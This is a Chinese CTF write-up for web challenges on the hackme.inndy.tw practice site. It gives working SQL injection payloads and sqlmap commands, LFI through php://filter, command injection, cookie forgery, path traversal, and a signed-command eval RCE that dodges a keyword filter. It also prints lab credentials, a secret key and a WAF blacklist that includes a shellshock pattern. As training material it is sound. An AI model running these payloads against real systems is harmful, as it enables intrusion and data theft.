# Web

## 12: hide and seek

在主页代码里面，搜索 FLAG 即可。

## 13: guestbook

> [sqlmap](http://sqlmap.org/) is your friend.

所以让我们的「好朋友」出场吧。

最终可以发现，`https://hackme.inndy.tw/gb/?mod=read&id=10` 中的 `id` 参数可以 SQL 注入。于是最终的 payload:

```shell
sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&id=10" -p id --dbs -D g8 --dump
```

## 14: LFI

LFI 是什么？它是 Local File Inclusion（本地文件包含）的缩写。

可以观察到该题的 URL 如下：

```
https://hackme.inndy.tw/lfi/?page=pages/index
https://hackme.inndy.tw/lfi/?page=pages/intro
https://hackme.inndy.tw/lfi/?page=pages/login
https://hackme.inndy.tw/lfi/?page=pages/flag
```

因此可以猜测，`page` 参数可以会有文件包含漏洞。访问 `https://hackme.inndy.tw/lfi/?page=notfound`（不存在的文件）可以看到一个小彩蛋 233333。

直接访问 `https://hackme.inndy.tw/lfi/?page=pages/flag` 得不到任何东西。根据提示 `php://filter`，可以构造：

```
https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag
```

将得到的内容用 base64 解码，得到：

```php+HTML
Can you read the flag<?php require('config.php'); ?>?
```

emmm 那看看 `config.php` 里面是什么吧。Payload:

```
https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config
```

解码后即可得到 flag。

## 15: homepage

主页中引用了 `https://hackme.inndy.tw/cute.js`，复制下来在控制台里运行然后扫码即可。

## 16: ping

源代码显示这个程序会对输入进行检测，然后执行 `ping`。我们的目标是命令执行，而不是真去  `ping`。PHP 中的 `exec()` 有点像 C 库的 `system()`，都是调用系统 shell 来执行命令，而不是直接去 `execve()`，所以我们可以在参数中加一点东西，让 shell 执行开发者意料之外的命令。有一些限制条件：

- 我们的 payload 不能超过 15 个字符。
- 一些特定的单词、符号不能够出现。

虽然很多常见的符号被过滤了，但是 `` ` `` 没有被过滤掉。

可以看看目录下面有什么：

```
`ls`
```

返回：

```
ping: unknown host flag.php
index.php
```

很明显，我们需要查看 `flag.php` 的内容，但是 `cat` 被过滤了。所以考虑用 `head` 或者 `tail` 来查看 flag.php。`flag` 被过滤了，但是可以用通配符。

Payload:

```
`tail f*`
```

## 17: scoreboard

记分板页面隐藏着怎样的秘密？查看源代码，没有发现什么有用的东西。转向网络请求，发现返回头的 `x-flag` 参数就是我们要的 flag。

## 18: login as admin 0

这里我们仍然尝试使用 `sqlmap`，但如果直接调用 `sqlmap`，会发现没有办法注入。

所以我们需要 tamper。`sqlmap` 内置的一些 tamper 可以在网络上查找到介绍，这里不再叙述。

源代码中「过滤请求」的部分如下：

```php
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}
```

可以注意到，虽然我们的请求字符串在转换为小写后中如果有 `or 1=1` 等字符串时整个请求会被清空，但是其他被直接过滤的字符串会改变数据库的内容，但我们的注入不会（也不应该）改变数据库。所以最关键的部分是第九行，将 `'` 替换为 `\'` 这**两个字符**（不是替换成 `\\'` 三个字符！可以在 PHP 的 REPL 里面亲自试一下。），即尝试转义请求字符串中的 `'`。

但如果我们的输入是 `\'` 呢？在该函数过滤之后结果就是 `\\'`。可以发现，`\` 被转义了，但是 `'` 没有。

查找资料可以发现，`sqlmap` 自带的 tamper `escapequotes.py` 可以像这样转义引号。该 tamper 的核心代码：

```python
return payload.replace("'", "\\'").replace('"', '\\"')
```

同样，它将 `sqlmap` 产生的 payload 进行处理，将 `'` 替换为 `\'` （**两个**字符），将 `"` 替换为 `\"`。

所以照样用 `sqlmap`，加上 tamper 就可以了。

Payload:

```shell
sqlmap -u "https://hackme.inndy.tw/login0/" --data="name=admin&password=bbb" --dbms=MySQL --tamper="escapequotes" -p password --dbs -D login_as_admin0 --columns --dump
```

获得 admin 密码，登录即可。

## 19: login as admin 0.1

非常怪异的是，`sqlmap` 无法得到表 `h1dden_f14g` 中 `the_f14g` 的内容。

我们加上 `-v3` 参数来显示详细的 payload。此处出现问题的 payload 如下：

```
bbb\' UNION ALL SELECT NULL,CONCAT(0x716a7a6271,IFNULL(CAST(the_f14g AS CHAR),0x20),0x7176707671),NULL,NULL FROM login_as_admin0.h1dden_f14g ORDER BY the_f14g-- jdWz
```

从之前 `sqlmap` 的结果可以知道表 `user` 有 4 列，第二列 `user` 会回显在登录成功的页面上。并且可知 flag 只有一个。所以简化为：

```
bbb\' UNION SELECT 1,CAST(the_f14g AS CHAR),3,4 FROM login_as_admin0.h1dden_f14g-- ddd
```

登录后即可获得 flag。

## 20: login as admin 1

该题提示不能使用 `sqlmap`。初测了一下，确实不行。但是观察代码，可以根据第 19 题的 payload 修改。

可以注意到空格被过滤了，所以用注释 `/**/` 代替空格就可以了。

密码字段的 payload:

```
bbb\'/**/UNION/**/SELECT/**/1,2,3,4#
```

## 21: login as admin 1.2

提示布尔盲注。如果之前试过给 `sqlmap` 加上随机 UA，写 tamper 改变结尾注释（如果结尾是 `-- xxxx` 的话似乎会失败）的话，会发现 `sqlmap` 找到了注入点，但是没有办法爆破。

原因在于，在第 18 题中，登录成功返回页面：

```php+HTML
<h3>Hi, <?=htmlentities($user->user)?></h3>
```

而该题中的登录成功返回页面：

```php+HTML
<h3>Hi, <?=htmlentities($_POST['name'])?></h3>
```

没有地方可以给 `union select` 注入返回数据。那么布尔盲注是怎么做到的呢？

寻找常见的布尔盲注测试的 payload 可以发现，当密码字段如下时（判断 MySQL 大版本是否为 5）：

```
b\'/**/or/**/left(version(),1)=5#
```

可以登录。但如果稍作修改：

```
b\'/**/or/**/left(version(),1)=4#
```

就无法登录。换言之，我们做到了判断 MySQL 的大版本号。

接下来呢？盲注自己弄真的太麻烦了，我又不想写脚本，所以就……`sqlmap` 吧。

当然直接硬来肯定是不可以的，需要给 `sqlmap` 加一些参数指导，最终命令如下：

```shell
sqlmap -u https://hackme.inndy.tw/login1/ --data "name=guest&password=guest" -p password --random-agent --dbms=MySQL --tamper="my_tamper.py,escapequotes,space2comment" -v 3 --technique B --risk=3 --level=5 --string "are not" --dbs -D login_as_admin1 --columns -o --threads 10 --dump
```

其中：

- `--random-agent`: 随机化 UA。`sqlmap` 默认 UA 直接暴露了自己是扫描器的事实，因为源代码中有 UA 过滤，所以加上了此参数。
- `--technique B`: 要求只使用布尔盲注。
- `--risk=3 --level=5`: 如果不用的话 `sqlmap` 不会测试 `OR boolean-based injection `。
- `--string "are not"`: 指示布尔盲注时布尔值为真时页面拥有的字符串。
- `-o --threads 10`: 优化运行速度（布尔盲注比较慢）。

tamper `my_tamper.py` 内容如下：

```python
def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    replaces comment at end to #
    """

    return payload.replace("-- ", "#")
```

## 22: login as admin 3

我们总算是逃脱了 SQL 注入的苦海😂。

查看源代码，发现加入了 `cookie` 验证。我们不知道 `$secret` 的内容。但可以注意到，校验 `cookie` 的关键语句是：

```php
hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']
```

函数 `hash_hmac()` 返回字符串，而这里使用了弱类型比较（`!=`）。如果 `$unserialized['sig']` 为 0，那么只要 `hash_hmac()` 返回值不会被转换为 0，那么这个条件就不会成立。

所以 `json` 为：

```json
{"sig":0,"data":"[\"admin\",true]"}
```

转换为 `cookie`：

```
eyJzaWciOjAsImRhdGEiOiJbXCJhZG1pblwiLHRydWVdIn0=
```

在登录页面设置 `document.cookie`，刷新即可。

## 23: login as admin 4

可以注意到，当密码错误时，代码会改变 `header`，试图将用户导向错误页面，但之后的校验只检查了用户名。

所以直接用 `curl` 访问。

```shell
curl -d "name=admin&password=a" https://hackme.inndy.tw/login4/
```

## 24: login as admin 6

```php
if(!empty($_POST['data'])) {
    try {
        $data = json_decode($_POST['data'], true);
    } catch (Exception $e) {
        $data = [];
    }
    extract($data);
    if($users[$username] && strcmp($users[$username], $password) == 0) {
        $user = $username;
    }
}
```

注意到 `extract()`，由于实际上我们可以修改 `$_POST['data']` 的内容，所以在这里可以变量覆盖 `$users`。

最终 `data` 为：

```json
data={"users":{"admin":"admin"},"username":"admin","password":"admin"}
```

`urlencode` 一下就行。

## 25: login as admin 7

就是 PHP 的 md5 漏洞，都变成套路了 2333333。

不知道是什么的话搜索 `php md5 0e`。

密码 `QNKCDZO`，登录即可。

## 26: dafuq-manager 1

查看 `cookie`，发现有个 `show_hidden` 参数。改成 `yes` 之后可以看到隐藏的两个文件。`flag` 就在其中。

## 27: dafuq-manager 2

第二个隐藏文件提示：

```
Try to login as admin! and you will get flag2
```

所以需要我们去看这个 manager 的源代码了，下载源代码，开始审计，重点关注与 `admin` 有关的部分。

在 `index.php` 中：

```php
case "admin":
	require "./core/fun_admin.php";
	show_admin($GLOBALS["dir"]);
break;
```

尝试访问 `https://dafuq-manager.hackme.inndy.tw/index.php?action=admin`，得到：

```
#0  show_error(You are not allowed to use this function.) called at [/var/www/webhdisk/core/fun_admin.php:218]
#1  show_admin() called at [/var/www/webhdisk/index.php:72]
```

提示权限不足。下面关注 `fun_admin.php`。

`show_admin()` 内容如下：

```php
function show_admin($dir) {
    $pwd = (($GLOBALS["permissions"] & 2) == 2);
    $admin = (($GLOBALS["permissions"] & 4) == 4);
    if (!$GLOBALS["require_login"]) show_error($GLOBALS["error_msg"]["miscnofunc"]);
    if (isset($GLOBALS['__GET']["action2"])) $action2 = $GLOBALS['__GET']["action2"];
    elseif (isset($GLOBALS['__POST']["action2"])) $action2 = $GLOBALS['__POST']["action2"];
    else $action2 = "";
    switch ($action2) {
        case "chpwd":
            if (!$pwd) show_error($GLOBALS["error_msg"]["accessfunc"]);
            changepwd($dir);
            break;
        case "adduser":
            if (!$admin) show_error($GLOBALS["error_msg"]["accessfunc"]);
            adduser($dir);
            break;
        case "edituser":
            if (!$admin) show_error($GLOBALS["error_msg"]["accessfunc"]);
            edituser($dir);
            break;
        case "rmuser":
            if (!$admin) show_error($GLOBALS["error_msg"]["accessfunc"]);
            removeuser($dir);
            break;
        default:
            if (!$pwd && !$admin) show_error($GLOBALS["error_msg"]["accessfunc"]);
            admin($admin, $dir);
        }
    }
```

要成为 admin，需要满足：

```php
$pwd = (($GLOBALS["permissions"] & 2) == 2);
$admin = (($GLOBALS["permissions"] & 4) == 4);
```

全局搜索 `permissions`，发现赋值在 `fun_users.php`。

```php
function activate_user($user, $pass) {
    $data = find_user($user, $pass);
    if ($data == NULL) return false;
    $GLOBALS['__SESSION']["s_user"] = $data[0];
    $GLOBALS['__SESSION']["s_pass"] = $data[1];
    $GLOBALS["home_dir"] = $data[2];
    $GLOBALS["home_url"] = $data[3];
    $GLOBALS["show_hidden"] = $data[4];
    $GLOBALS["no_access"] = $data[5];
    $GLOBALS["permissions"] = $data[6];
    return true;
}
```

变量 `$data` 在 `find_user()` 中。

```php
function &find_user($user, $pass) {
    $cnt = count($GLOBALS["users"]);
    for ($i = 0;$i < $cnt;++$i) {
        if ($user == $GLOBALS["users"][$i][0]) {
            if ($pass == NULL || ($pass == $GLOBALS["users"][$i][1] && $GLOBALS["users"][$i][7])) {
                return $GLOBALS["users"][$i];
            }
        }
    }
    return NULL;
}
```

而 `$GLOBALS["users"]` 在哪里呢？全局搜索，发现在 `.htusers.php` 中：

```php
<?php
$GLOBALS["users"] = array(
    array("guest", "084e0343a0486ff05530df6c705c8bb4", "./data/guest", "https://game1.security.ntu.st/data/guest", 0, "^.ht", 1, 1),
);

```

所以我们是否能够尝试读取服务器上的 `.htusers.php`？直接访问 `https://dafuq-manager.hackme.inndy.tw/.config/.htusers.php` 肯定是没办法看到变量内容的。

先看看能不能用 `download` 下载。在 `index.php` 中：

```php
case "download":
	ob_start(); // prevent unwanted output
	require "./core/fun_down.php";
	ob_end_clean(); // get rid of cached unwanted output
	download_item($GLOBALS["dir"], $GLOBALS["item"]);
	ob_start(false); // prevent unwanted output
	exit;
break;
```

`fun_down.php` 内容如下：

```php
<?php
require_once ('core/secure.php');
function download_item($dir, $item) {
    $item = basename($item);
    if (($GLOBALS["permissions"] & 01) != 01) show_error($GLOBALS["error_msg"]["accessfunc"]);
    if (!get_is_file($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["fileexist"]);
    if (!get_show_item($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["accessfile"]);
    $abs_item = get_abs_item($dir, $item);
    if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . ": " . $GLOBALS["error_msg"]["accessfile"]);
    $browser = id_browser();
    header('Content-Type: ' . (($browser == 'IE' || $browser == 'OPERA') ? 'application/octetstream' : 'application/octet-stream'));
    header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT');
    header('Content-Transfer-Encoding: binary');
    header('Content-Length: ' . filesize($abs_item));
    if ($browser == 'IE') {
        header('Content-Disposition: attachment; filename="' . $item . '"');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
    } else {
        header('Content-Disposition: attachment; filename="' . $item . '"');
        header('Cache-Control: no-cache, must-revalidate');
        header('Pragma: no-cache');
    }
    @readfile($abs_item);
    exit;
}
```

已知 `guest` 的 `permissions` 为 1，所以用户方面没有什么问题。如果直接尝试下载：

```
https://dafuq-manager.hackme.inndy.tw/index.php?action=download&item=../../.config/.htusers.php&order=name&srt=yes&lang=cht
```

会报错：

```
#0  show_error(.htusers.php: 檔案不存在。) called at [/var/www/webhdisk/core/fun_down.php:6]
#1  download_item(, .htusers.php) called at [/var/www/webhdisk/index.php:34]
```

注意到我们跳出目录的尝试直接被过滤了。全局搜索 `$GLOBALS["item"]`，发现在 `init.php` 中：

```php
if (isset($GLOBALS['__GET']["item"])) $GLOBALS["item"] = stripslashes($GLOBALS['__GET']["item"]);
else $GLOBALS["item"] = "";
```

但 `stripslashes()` 不会影响我们。回头再去 `fun_down.php`，发现第 4 行：

```php
$item = basename($item);
```

过滤了我们的 `../`。

那么看看另一个功能 `edit`。下面是 `fun_edit.php` 中 `edit_file()` 函数的一部分。

```php
function edit_file($dir, $item) {
    if (($GLOBALS["permissions"] & 01) != 01) show_error($GLOBALS["error_msg"]["accessfunc"]);
    if (!get_is_file($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["fileexist"]);
    if (!get_show_item($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["accessfile"]);
    $fname = get_abs_item($dir, $item);
    if (!file_in_web($fname)) show_error($GLOBALS["error_msg"]["accessfile"]);
    if (isset($GLOBALS['__POST']["dosave"]) && $GLOBALS['__POST']["dosave"] == "yes") {
        $item = basename(stripslashes($GLOBALS['__POST']["fname"]));
        $fname2 = get_abs_item($dir, $item);
        if (!isset($item) || $item == "") show_error($GLOBALS["error_msg"]["miscnoname"]);
        if ($fname != $fname2 && @file_exists($fname2)) show_error($item . ": " . $GLOBALS["error_msg"]["itemdoesexist"]);
        savefile($dir, $fname2);
        $fname = $fname2;
    }
    $fp = @fopen($fname, "r");
    if ($fp === false) show_error($item . ": " . $GLOBALS["error_msg"]["openfile"]);
    $s_item = get_rel_item($dir, $item);
    if (strlen($s_item) > 50) $s_item = "..." . substr($s_item, -47);
    show_header($GLOBALS["messages"]["actedit"] . ": /" . $s_item); ?><script language="JavaScript1.2" type="text/javascript">
<!--
```

没有 `basename()`。

所以尝试以下：

```
https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=../../.config/.htusers.php&order=name&srt=yes&lang=cht
```

成功！

文件内容：

```php
<?php
$GLOBALS["users"] = array(
    array("adm1n15trat0r", "34af0d074b17f44d1bb939765b02776f", "./data", "https://dafuq-manager.hackme.inndy.tw/data", 1, "^.ht", 7, 1),
    array("inndy", "fc5e038d38a57032085441e7fe7010b0", "./data/inndy", "https://dafuq-manager.hackme.inndy.tw/data/inndy", 0, "^.ht", 1, 1),
    array("guest", "084e0343a0486ff05530df6c705c8bb4", "./data/guest", "https://dafuq-manager.hackme.inndy.tw/data/guest", 0, "^.ht", 1, 1),
);

```

管理员密码 hash 为 `34af0d074b17f44d1bb939765b02776f`，拖到 http://www.cmd5.com/ 看看，发现要付费，之后一番波折，解密出了密码为 `how do you turn this on`。

登录就能看到 flag 了。

## 28: dafuq-manager 3

要求 get a shell。但要代码执行的话……我们上传个文件试试？但是失败了，再弄弄就发现这个网站似乎是只读的。（想想也是，不然到今天题目就没法做了）

在 `index.php` 中有一个奇怪的功能 `debug`，尝试：

```
https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht
```

返回错误：

```
#0  show_error(You are not hacky enough :() called at [/var/www/webhdisk/core/fun_debug.php:10]
#1  do_debug() called at [/var/www/webhdisk/index.php:76]
```

`You are not hacky enough :(`？看来这里可能就是突破口。

`fun_debug.php` 内容如下：

```php
<?php
function make_command($cmd) {
    $hmac = hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]);
    return sprintf('%s.%s', base64_encode($cmd), $hmac);
}
function do_debug() {
    assert(strlen($GLOBALS['secret_key']) > 40);
    $dir = $GLOBALS['__GET']['dir'];
    if (strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")) {
        show_error('You are not hacky enough :(');
    }
    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);
    $cmd = base64_decode($cmd);
    $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',);
    foreach ($bad_things as $bad) {
        if (stristr($cmd, $bad)) {
            die('2bad');
        }
    }
    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)) {
        die(eval($cmd));
    } else {
        show_error('What does the fox say?');
    }
}
```

似乎可以执行命令。现在看来首先要让 `strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")` 不成立。但是 `strcmp()` 的参数如果是数组，那么就会有惊喜。

尝试：

```
https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a
```

返回错误：

```
#0  show_error(What does the fox say?) called at [/var/www/webhdisk/core/fun_debug.php:23]
#1  do_debug() called at [/var/www/webhdisk/index.php:76]
```

What does the fox say? ~~大楚兴，陈胜王~~

好了不开玩笑了，现在我们需要让 `hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)` 满足。

首先 `$GLOBALS["secret_key"]` 在哪里？全局查找就能找到了：

```php
$GLOBALS["secret_key"] = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
```

将 `make_command()` 修改为：

```php
function make_command($cmd) {
    $hmac = hash_hmac('sha256', $cmd, 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3');
    return sprintf('%s.%s', base64_encode($cmd), $hmac);
}
```

开 `php -a`，把这个函数拖进去。然后试试：

```
php > echo make_command("phpinfo();");
cGhwaW5mbygpOw==.5f043639d3ab2a90ecff68818494100d54b98e737ca72fe927b9b5e365e59eb4
```

`urlencode` 之后 `GET` 一下：

```
https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a&command=cGhwaW5mbygpOw%3D%3D.5f043639d3ab2a90ecff68818494100d54b98e737ca72fe927b9b5e365e59eb4
```

成功！我们执行了 `phpinfo()`。

接下来就是看 flag 文件的时候了。尽管有过滤，但这一类直接搜索字符串的过滤都是纸老虎。~~作为世界上最好的语言，~~PHP 有很多你想象不到的技巧。

```
php > echo make_command('$v1=\'sys\';$v2=\'tem\';$v3=$v1.$v2;$v3(\'ls\');');
JHYxPSdzeXMnOyR2Mj0ndGVtJzskdjM9JHYxLiR2MjskdjMoJ2xzJyk7.320ae7d860c0e68ff17aad5ce0d72208bcf6a2999b7ba8f1592d34fe5f7bbff4
```

（PHP 内单、双引号有区别，需要注意）

然后：

```
https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a&command=JHYxPSdzeXMnOyR2Mj0ndGVtJzskdjM9JHYxLiR2MjskdjMoJ2xzJyk7.320ae7d860c0e68ff17aad5ce0d72208bcf6a2999b7ba8f1592d34fe5f7bbff4
```

返回：

```
core data flag3 img index.php lang lib style
```

成功！`flag3` 似乎近在眼前。

但是尝试运行 `cat flag3`：

```
https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a&command=JHYxPSdzeXMnOyR2Mj0ndGVtJzskdjM9JHYxLiR2MjskdjMoJ2NhdCBmbGFnMycpOw%3D%3D.dc6aaa6fe380828fab4665574c17d71d36882e0ffcd1287f9da416581bb30292
```

却什么都没有返回。

难道 `flag3` 是个目录？执行 `ls -l flag3`，果然：

```shell
total 24
-rw-r--r-- 1 root  root   161 Oct  4  2016 Makefile
-r-------- 1 flag3 flag3   72 Oct  4  2016 flag3
-rws--s--x 1 flag3 flag3 9232 Oct  4  2016 meow
-rw-r--r-- 1 root  root   783 Oct  4  2016 meow.c
```

`cat flag3/meow.c`：

```c
#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char *argv[])
{
	const char *exec = argv[0];
	const char *flag = argv[1];
	char buffer[4096];

	if(argc < 2) {
		printf("Usage: %s flag\n", argv[0]);
		puts("We have cat to read file, And the meow to cat flag.");
		return 0;
	}

	struct stat S;
	if(stat(exec, &S) != 0) {
		printf("Can not stat file %s\n", exec);
		return 1;
	}

	uid_t uid = S.st_uid;
	gid_t gid = S.st_gid;

	setuid(uid);
	seteuid(uid);
	setgid(gid);
	setegid(gid);

	int fd = open(flag, O_RDONLY);
	if(fd == -1) {
		printf("Can not open file %s\n", flag);
		return 2;
	}
	ssize_t readed = read(fd, buffer, sizeof(buffer) - 1);
	if(readed > 0) {
		write(1, buffer, readed);
	}
	close(fd);
}
```

那就用这个程序去读 flag 了。

```
https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a&command=JHYxPSdzeXMnOyR2Mj0ndGVtJzskdjM9JHYxLiR2MjskdjMoJy4vZmxhZzMvbWVvdyBmbGFnMy9mbGFnMycpOw%3D%3D.2619d41150bac3f1bcf1e059966be08e85aaa573e144d9223c53cc4d765cf8f8
```

got it!

## 29: wordpress 1

这题的源代码还是直接给你的，但是对于部分国家或地区的人来说，拿到这份源代码并不容易。

这是一整个 WordPress 的代码，一个一个文件去看的话……太疯狂了。

已知 WordPress 版本为 4.6.1（可以在 `wp-admin/about.php` 看到），去官网下载了一份，然后两份代码 `diff`。

```shell
➜  Downloads diff -rq wordpress wordpress-1                                    
Only in wordpress: .DS_Store
Files wordpress/readme.html and wordpress-1/readme.html differ
Only in wordpress-1/wp-admin: js
Only in wordpress-1: wp-config-sample.php
Only in wordpress/wp-content: .DS_Store
Only in wordpress/wp-content: languages
Only in wordpress-1/wp-content/plugins: akismet
Only in wordpress/wp-content/plugins: core.php
Only in wordpress-1/wp-content/plugins: hello.php
Only in wordpress/wp-content/themes: astrid
Only in wordpress-1/wp-content/themes: twentyfifteen
Only in wordpress-1/wp-content/themes: twentyfourteen
Only in wordpress-1/wp-content/themes: twentysixteen
Only in wordpress/wp-content: upgrade
Only in wordpress/wp-content: uploads
Files wordpress/wp-includes/functions.php and wordpress-1/wp-includes/functions.php differ
Only in wordpress-1/wp-includes: js
Files wordpress/wp-includes/version.php and wordpress-1/wp-includes/version.php differ
```

忽略 `.DS_Store`（这是我 Mac 的问题），按照这份列表排查，工作量就小得多了。

问题版本的 `wp-admin` 和 `wp-includes` 没有 `js` 文件夹，根下没有配置样例，多了繁体中文翻译，插件、主题不同，`wp-content` 多了 `upgrade` 和 `uploads` 两个空文件夹。`wp-includes/version.php` 不同（语言配置），`wp-includes/functions.php` 多了一些奇怪的东西。

```php
/**
 * Try to get user's IP
 *
 * @since 0.87
 *
 * @return string User's IP
 */
function wp_get_user_ip() {
	$ip = $_SERVER['REMOTE_ADDR'];
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	return $ip;
}
```

看起来是来统计用户信息的，先不管。发现插件的 `core.php` 有点东西：

```php
<?php
/**
 * @package f14gPrinter
 * @version 3.1415926
 */
/*
Plugin Name: Super f14g Printer
Plugin URI: https://game2.security.ntu.st
Description: This plugin can print f14g1 for you if you know the password!
Author: Inndy Lin
Version: 3.1415926
Author URI: https://inndy.tw
*/

function print_f14g()
{
	$h = 'm'.sprintf('%s%d','d',-4+9e0);
	if($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') {
		if(wp_get_user_ip() === '127.0.0.1') {
			eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT)));
		} else {
			die('</head><body><h1>Sorry, Only admin from localhost can get flag');
		}
	}
}

add_action('wp_head', 'print_f14g');

```

`$h` 值为 `'m'` 和 `'d5'` 拼接而成，然后在第 18 行调用~~不愧是世界上最好的语言！~~。那段 MD5 就是 `cat flag`，尝试：

```
https://wp.hackme.inndy.tw/?passw0rd=cat%20flag
```

被第二个条件拦住。

`wp_get_user_ip() === '127.0.0.1'` 中左值就是我们发现 `functions.php` 多出来的函数。

```
Client-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```

因此，在 header 里面加点东西，搜一下返回的 HTML 就能找到 flag 了。

## 30: wordpress 2

上一个 flag 提示主题里面有问题。但是主题的文件也有很多。所以我们找到主题的原始代码。可以发现主题为 astrid 1.11（可以看 `style.css` 开头）。我们 `checkout` 一下。

```shell
svn checkout https://themes.svn.wordpress.org/astrid/
```

然后比较。

```shell
➜  Downloads diff -rq wordpress/wp-content/themes/astrid astrid/1.11
Only in astrid/1.11: screenshot.png
Files wordpress/wp-content/themes/astrid/template-parts/content-search.php and astrid/1.11/template-parts/content-search.php differ
```

那么只可能是这个文件有鬼了。

```php+HTML
<?php
/**
 * Template part for displaying results in search pages.
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package Astrid
 */

?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<header class="entry-header">
		<?php the_title( sprintf( '<h2 class="entry-title"><a href="%s" rel="bookmark">', esc_url( get_permalink() ) ), '</a></h2>' ); ?>

		<?php if ( 'post' === get_post_type() ) : ?>
		<div class="entry-meta">
			<?php astrid_posted_on(); ?>
		</div><!-- .entry-meta -->
		<?php endif; ?>
	</header><!-- .entry-header -->

	<div class="entry-summary">
		<?php the_excerpt(); ?>
	</div><!-- .entry-summary -->
	<!-- debug:<?php var_dump($wp_query->post->{'post_'.(string)($_GET['debug']?:'type')}); ?> -->

	<footer class="entry-footer">
		<?php astrid_entry_footer(); ?>
	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

```

第 26 行是多出来的部分。但怎么利用呢？

查看博客文章可以发现，有一篇被加密了：

```
https://wp.hackme.inndy.tw/archives/78
```

那现在要么找到密码，要么绕过密码，直接查看内容。

发现当 `debug` 参数为 `content` 时会返回文章内容。尝试在归档里面搜索：

```
https://wp.hackme.inndy.tw/archives/date/2013/10/?s&debug=content
```

即可获得 flag。

## 32: command-executor

（31 题似乎坏了？）

这次源代码没那么简单能拿到了。这个站点看上去全是漏洞，但是获得一个能用的不容易。

几个问题：

- `https://command-executor.hackme.inndy.tw/index.php?func=ls&file=.` 中的 `file` 可以任意指定，可以用来查看系统文件结构。
- `https://command-executor.hackme.inndy.tw/index.php?func=man&file=ls` 中的 `file` 可以任意指定，可以用来查看系统任意帮助文档。

（然而并没有什么卵用）

不过在该目录下：

```shell
total 332
drwxr-xr-x 4 root root   4096 Jan  9  2018 bootstrap
-rw-r--r-- 1 root root 293424 Jan  9  2018 cat-flag.png
-rw-r--r-- 1 root root   1163 Jan  9  2018 cmd.php
drwxr-xr-x 2 root root   4096 Jan  9  2018 comic-neue
-rw-r--r-- 1 root root    612 Jan 19  2018 index.nginx-debian.html
-rw-r--r-- 1 root root   2201 Jan  9  2018 index.php
-rw-r--r-- 1 root root    515 Jan  9  2018 ls.php
-rw-r--r-- 1 root root    658 Jan 19  2018 man.php
-rw-r--r-- 1 root root    588 Jan  9  2018 untar.php
-rw-r--r-- 1 root root  11829 Jan  9  2018 windows-run.jpg
```

可以看到 `cmd.php`, `ls.php` 等文件，再看 URL，是否可以本地文件包含？

答案是可以的。

```
https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index
```

解码后：

```php+HTML
<?php
$pages = [
    ['man', 'Man'],
    ['untar', 'Tar Tester'],
    ['cmd', 'Cmd Exec'],
    ['ls', 'List files'],
];

function fuck($msg) {
    header('Content-Type: text/plain');
    echo $msg;
    exit;
}

$black_list = [
    '\/flag', '\(\)\s*\{\s*:;\s*\};'
];

function waf($a) {
    global $black_list;
    if(is_array($a)) {
        foreach($a as $key => $val) {
            waf($key);
